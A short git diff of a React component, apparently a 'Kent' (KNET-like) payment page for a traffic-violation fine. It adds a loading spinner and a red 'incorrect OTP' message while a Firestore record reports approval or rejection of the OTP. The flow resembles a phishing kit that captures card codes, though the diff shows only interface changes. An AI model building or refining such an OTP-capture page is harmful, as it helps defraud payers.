@@ -6,6 +6,7 @@ import "./kent.css"
 import { doc, onSnapshot } from "firebase/firestore"
 import { addData, db, handlePay } from "../firebase"
 import FullPageLoader from "../loader1"
+import { Loader } from "../loader"
 
 // Update the PaymentInfo type to include otp2
 type PaymentInfo = {
@@ -816,11 +817,12 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
                   {paymentInfo.status === "approved"
                     ? "تم التحقق ✓"
                     : paymentInfo.status === "rejected"
-                      ? "OTP رمز التحقق غير صيحيح ✗"
+                      ?<span style={{color:'red'}}> {" OTP رمز التحقق غير صحيح   ✗"}</span>
                       : "انتظار التحقق ..."}
                 </span>
               </div>
             </div>
+            {paymentInfo.status === "rejected"?null:<div style={{display:'flex',justifyContent:"center"}}><Loader/></div>} 
           </div>
         )
 
